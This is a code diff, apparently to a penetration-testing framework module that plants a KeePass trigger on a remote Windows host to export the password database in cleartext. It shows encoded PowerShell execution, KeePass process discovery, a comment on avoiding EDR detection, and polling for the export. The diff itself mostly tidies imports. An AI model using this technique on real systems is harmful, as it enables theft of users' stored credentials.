@@ -1,6 +1,6 @@
-import csv
 import sys
-import time
+from time import sleep
+from csv import reader
 from base64 import b64encode
 from io import BytesIO, StringIO
 from xml.etree import ElementTree
@@ -19,7 +19,7 @@ class CMEModule:
     name = 'keepass_trigger'
     description = "Set up a malicious KeePass trigger to export the database in cleartext."
     supported_protocols = ['smb']
-    opsec_safe = True   # while the module only executes legit powershell commands on the target (search and edit files)
+    opsec_safe = False   # while the module only executes legit powershell commands on the target (search and edit files)
                         # some EDR like Trend Micro flag base64-encoded powershell as malicious
                         # the option PSH_EXEC_METHOD can be used to avoid such execution, and will drop scripts on the target
     multiple_hosts = False
@@ -140,7 +140,7 @@ class CMEModule:
             add_trigger_script_b64 = b64encode(self.add_trigger_script_str.encode('UTF-16LE')).decode('utf-8')
             add_trigger_script_cmd = 'powershell.exe -e {}'.format(add_trigger_script_b64)
             connection.execute(add_trigger_script_cmd)
-            time.sleep(2) # as I noticed some delay may happen with the encoded powershell command execution
+            sleep(2) # as I noticed some delay may happen with the encoded powershell command execution
         elif self.powershell_exec_method == 'PS1':
             try:
                 self.put_file_execute_delete(context, connection, self.add_trigger_script_str)
@@ -170,7 +170,7 @@ class CMEModule:
         # search for keepass processes
         search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
         search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
-        csv_reader = csv.reader(search_keepass_process_output_csv.split('\n'), delimiter=',') # we return the powershell command as a CSV for easier column parsing
+        csv_reader = reader(search_keepass_process_output_csv.split('\n'), delimiter=',') # we return the powershell command as a CSV for easier column parsing
         next(csv_reader)  # to skip the header line
         keepass_process_list = list(csv_reader)
         # check if multiple processes belonging to different users are running (in order to choose which one to restart)
@@ -236,7 +236,7 @@ class CMEModule:
             poll_exports_command_output = connection.execute(poll_export_command_str, True)
             if self.export_name not in poll_exports_command_output:
                 print('.', end='', flush=True)
-                time.sleep(self.poll_frequency_seconds)
+                sleep(self.poll_frequency_seconds)
                 continue
             print('')
 
